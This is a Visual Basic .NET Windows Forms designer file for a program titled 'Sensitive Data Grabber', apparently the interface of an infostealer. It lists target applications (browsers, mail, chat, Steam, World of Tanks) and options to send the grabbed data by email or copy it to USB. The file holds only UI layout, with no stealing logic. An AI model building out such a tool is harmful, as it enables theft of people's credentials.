<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class MainForm
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.Button1 = New System.Windows.Forms.Button()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.RadioButton3 = New System.Windows.Forms.RadioButton()
        Me.RadioButton2 = New System.Windows.Forms.RadioButton()
        Me.RadioButton1 = New System.Windows.Forms.RadioButton()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.Button2 = New System.Windows.Forms.Button()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.TextBox5 = New System.Windows.Forms.TextBox()
        Me.TextBox4 = New System.Windows.Forms.TextBox()
        Me.TextBox3 = New System.Windows.Forms.TextBox()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.chkOneNote = New System.Windows.Forms.CheckBox()
        Me.chkPidgin = New System.Windows.Forms.CheckBox()
        Me.chkWoT = New System.Windows.Forms.CheckBox()
        Me.chkSteam = New System.Windows.Forms.CheckBox()
        Me.chkEvernote = New System.Windows.Forms.CheckBox()
        Me.chkThunderbird = New System.Windows.Forms.CheckBox()
        Me.chkChrome = New System.Windows.Forms.CheckBox()
        Me.chkFirefox = New System.Windows.Forms.CheckBox()
        Me.MenuStrip1 = New System.Windows.Forms.MenuStrip()
        Me.OptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ChangeEmailCredentialsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.GroupBox1.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.GroupBox3.SuspendLayout()
        Me.MenuStrip1.SuspendLayout()
        Me.SuspendLayout()
        '
        'Button1
        '
        Me.Button1.Location = New System.Drawing.Point(119, 250)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(75, 23)
        Me.Button1.TabIndex = 2
        Me.Button1.Text = "Work"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.RadioButton3)
        Me.GroupBox1.Controls.Add(Me.RadioButton2)
        Me.GroupBox1.Controls.Add(Me.RadioButton1)
        Me.GroupBox1.Location = New System.Drawing.Point(30, 42)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(200, 100)
        Me.GroupBox1.TabIndex = 3
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "How to save your data?"
        '
        'RadioButton3
        '
        Me.RadioButton3.AutoSize = True
        Me.RadioButton3.Location = New System.Drawing.Point(6, 65)
        Me.RadioButton3.Name = "RadioButton3"
        Me.RadioButton3.Size = New System.Drawing.Size(153, 17)
        Me.RadioButton3.TabIndex = 2
        Me.RadioButton3.TabStop = True
        Me.RadioButton3.Text = "Save on a specific location"
        Me.RadioButton3.UseVisualStyleBackColor = True
        '
        'RadioButton2
        '
        Me.RadioButton2.AutoSize = True
        Me.RadioButton2.Location = New System.Drawing.Point(6, 19)
        Me.RadioButton2.Name = "RadioButton2"
        Me.RadioButton2.Size = New System.Drawing.Size(91, 17)
        Me.RadioButton2.TabIndex = 1
        Me.RadioButton2.TabStop = True
        Me.RadioButton2.Text = "Send by email"
        Me.RadioButton2.UseVisualStyleBackColor = True
        '
        'RadioButton1
        '
        Me.RadioButton1.AutoSize = True
        Me.RadioButton1.Location = New System.Drawing.Point(6, 42)
        Me.RadioButton1.Name = "RadioButton1"
        Me.RadioButton1.Size = New System.Drawing.Size(125, 17)
        Me.RadioButton1.TabIndex = 0
        Me.RadioButton1.TabStop = True
        Me.RadioButton1.Text = "Save on a USB drive"
        Me.RadioButton1.UseVisualStyleBackColor = True
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.Button2)
        Me.GroupBox2.Controls.Add(Me.Label3)
        Me.GroupBox2.Controls.Add(Me.Label2)
        Me.GroupBox2.Controls.Add(Me.Label1)
        Me.GroupBox2.Controls.Add(Me.TextBox5)
        Me.GroupBox2.Controls.Add(Me.TextBox4)
        Me.GroupBox2.Controls.Add(Me.TextBox3)
        Me.GroupBox2.Location = New System.Drawing.Point(30, 160)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(200, 125)
        Me.GroupBox2.TabIndex = 4
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "By email"
        '
        'Button2
        '
        Me.Button2.Location = New System.Drawing.Point(119, 95)
        Me.Button2.Name = "Button2"
        Me.Button2.Size = New System.Drawing.Size(75, 23)
        Me.Button2.TabIndex = 5
        Me.Button2.Text = "Send"
        Me.Button2.UseVisualStyleBackColor = True
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(6, 78)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(46, 13)
        Me.Label3.TabIndex = 5
        Me.Label3.Text = "Subject:"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(6, 52)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(33, 13)
        Me.Label2.TabIndex = 4
        Me.Label2.Text = "From:"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(6, 26)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(23, 13)
        Me.Label1.TabIndex = 3
        Me.Label1.Text = "To:"
        '
        'TextBox5
        '
        Me.TextBox5.Location = New System.Drawing.Point(52, 71)
        Me.TextBox5.Name = "TextBox5"
        Me.TextBox5.Size = New System.Drawing.Size(142, 20)
        Me.TextBox5.TabIndex = 2
        '
        'TextBox4
        '
        Me.TextBox4.Location = New System.Drawing.Point(52, 45)
        Me.TextBox4.Name = "TextBox4"
        Me.TextBox4.Size = New System.Drawing.Size(142, 20)
        Me.TextBox4.TabIndex = 1
        '
        'TextBox3
        '
        Me.TextBox3.Location = New System.Drawing.Point(52, 19)
        Me.TextBox3.Name = "TextBox3"
        Me.TextBox3.Size = New System.Drawing.Size(142, 20)
        Me.TextBox3.TabIndex = 0
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.chkOneNote)
        Me.GroupBox3.Controls.Add(Me.chkPidgin)
        Me.GroupBox3.Controls.Add(Me.chkWoT)
        Me.GroupBox3.Controls.Add(Me.Button1)
        Me.GroupBox3.Controls.Add(Me.chkSteam)
        Me.GroupBox3.Controls.Add(Me.chkEvernote)
        Me.GroupBox3.Controls.Add(Me.chkThunderbird)
        Me.GroupBox3.Controls.Add(Me.chkChrome)
        Me.GroupBox3.Controls.Add(Me.chkFirefox)
        Me.GroupBox3.Location = New System.Drawing.Point(259, 42)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(200, 284)
        Me.GroupBox3.TabIndex = 5
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Applications"
        '
        'chkOneNote
        '
        Me.chkOneNote.AutoSize = True
        Me.chkOneNote.Location = New System.Drawing.Point(7, 66)
        Me.chkOneNote.Name = "chkOneNote"
        Me.chkOneNote.Size = New System.Drawing.Size(115, 17)
        Me.chkOneNote.TabIndex = 7
        Me.chkOneNote.Text = "Microsoft OneNote"
        Me.chkOneNote.UseVisualStyleBackColor = True
        '
        'chkPidgin
        '
        Me.chkPidgin.AutoSize = True
        Me.chkPidgin.Location = New System.Drawing.Point(6, 136)
        Me.chkPidgin.Name = "chkPidgin"
        Me.chkPidgin.Size = New System.Drawing.Size(55, 17)
        Me.chkPidgin.TabIndex = 6
        Me.chkPidgin.Text = "Pidgin"
        Me.chkPidgin.UseVisualStyleBackColor = True
        '
        'chkWoT
        '
        Me.chkWoT.AutoSize = True
        Me.chkWoT.Location = New System.Drawing.Point(5, 182)
        Me.chkWoT.Name = "chkWoT"
        Me.chkWoT.Size = New System.Drawing.Size(99, 17)
        Me.chkWoT.TabIndex = 5
        Me.chkWoT.Text = "World of Tanks"
        Me.chkWoT.UseVisualStyleBackColor = True
        '
        'chkSteam
        '
        Me.chkSteam.AutoSize = True
        Me.chkSteam.Location = New System.Drawing.Point(6, 159)
        Me.chkSteam.Name = "chkSteam"
        Me.chkSteam.Size = New System.Drawing.Size(56, 17)
        Me.chkSteam.TabIndex = 4
        Me.chkSteam.Text = "Steam"
        Me.chkSteam.UseVisualStyleBackColor = True
        '
        'chkEvernote
        '
        Me.chkEvernote.AutoSize = True
        Me.chkEvernote.Location = New System.Drawing.Point(7, 20)
        Me.chkEvernote.Name = "chkEvernote"
        Me.chkEvernote.Size = New System.Drawing.Size(69, 17)
        Me.chkEvernote.TabIndex = 3
        Me.chkEvernote.Text = "Evernote"
        Me.chkEvernote.UseVisualStyleBackColor = True
        '
        'chkThunderbird
        '
        Me.chkThunderbird.AutoSize = True
        Me.chkThunderbird.Location = New System.Drawing.Point(6, 113)
        Me.chkThunderbird.Name = "chkThunderbird"
        Me.chkThunderbird.Size = New System.Drawing.Size(118, 17)
        Me.chkThunderbird.TabIndex = 2
        Me.chkThunderbird.Text = "Mozilla Thunderbird"
        Me.chkThunderbird.UseVisualStyleBackColor = True
        '
        'chkChrome
        '
        Me.chkChrome.AutoSize = True
        Me.chkChrome.Location = New System.Drawing.Point(7, 42)
        Me.chkChrome.Name = "chkChrome"
        Me.chkChrome.Size = New System.Drawing.Size(99, 17)
        Me.chkChrome.TabIndex = 1
        Me.chkChrome.Text = "Google Chrome"
        Me.chkChrome.UseVisualStyleBackColor = True
        '
        'chkFirefox
        '
        Me.chkFirefox.AutoSize = True
        Me.chkFirefox.Location = New System.Drawing.Point(6, 89)
        Me.chkFirefox.Name = "chkFirefox"
        Me.chkFirefox.Size = New System.Drawing.Size(92, 17)
        Me.chkFirefox.TabIndex = 0
        Me.chkFirefox.Text = "Mozilla Firefox"
        Me.chkFirefox.UseVisualStyleBackColor = True
        '
        'MenuStrip1
        '
        Me.MenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.OptionsToolStripMenuItem})
        Me.MenuStrip1.Location = New System.Drawing.Point(0, 0)
        Me.MenuStrip1.Name = "MenuStrip1"
        Me.MenuStrip1.Size = New System.Drawing.Size(471, 24)
        Me.MenuStrip1.TabIndex = 6
        Me.MenuStrip1.Text = "MenuStrip1"
        '
        'OptionsToolStripMenuItem
        '
        Me.OptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ChangeEmailCredentialsToolStripMenuItem})
        Me.OptionsToolStripMenuItem.Name = "OptionsToolStripMenuItem"
        Me.OptionsToolStripMenuItem.Size = New System.Drawing.Size(61, 20)
        Me.OptionsToolStripMenuItem.Text = "Options"
        '
        'ChangeEmailCredentialsToolStripMenuItem
        '
        Me.ChangeEmailCredentialsToolStripMenuItem.Name = "ChangeEmailCredentialsToolStripMenuItem"
        Me.ChangeEmailCredentialsToolStripMenuItem.Size = New System.Drawing.Size(207, 22)
        Me.ChangeEmailCredentialsToolStripMenuItem.Text = "Change email credentials"
        '
        'Timer1
        '
        '
        'MainForm
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(471, 351)
        Me.Controls.Add(Me.GroupBox3)
        Me.Controls.Add(Me.GroupBox2)
        Me.Controls.Add(Me.GroupBox1)
        Me.Controls.Add(Me.MenuStrip1)
        Me.MainMenuStrip = Me.MenuStrip1
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "MainForm"
        Me.Text = "Sensitive Data Grabber"
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        Me.MenuStrip1.ResumeLayout(False)
        Me.MenuStrip1.PerformLayout()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents Button1 As System.Windows.Forms.Button
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents RadioButton3 As System.Windows.Forms.RadioButton
    Friend WithEvents RadioButton2 As System.Windows.Forms.RadioButton
    Friend WithEvents RadioButton1 As System.Windows.Forms.RadioButton
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents Button2 As System.Windows.Forms.Button
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents TextBox5 As System.Windows.Forms.TextBox
    Friend WithEvents TextBox4 As System.Windows.Forms.TextBox
    Friend WithEvents TextBox3 As System.Windows.Forms.TextBox
    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
    Friend WithEvents chkWoT As System.Windows.Forms.CheckBox
    Friend WithEvents chkSteam As System.Windows.Forms.CheckBox
    Friend WithEvents chkEvernote As System.Windows.Forms.CheckBox
    Friend WithEvents chkThunderbird As System.Windows.Forms.CheckBox
    Friend WithEvents chkChrome As System.Windows.Forms.CheckBox
    Friend WithEvents chkFirefox As System.Windows.Forms.CheckBox
    Friend WithEvents chkPidgin As System.Windows.Forms.CheckBox
    Friend WithEvents chkOneNote As System.Windows.Forms.CheckBox
    Friend WithEvents MenuStrip1 As System.Windows.Forms.MenuStrip
    Friend WithEvents OptionsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ChangeEmailCredentialsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Timer1 As System.Windows.Forms.Timer

End Class
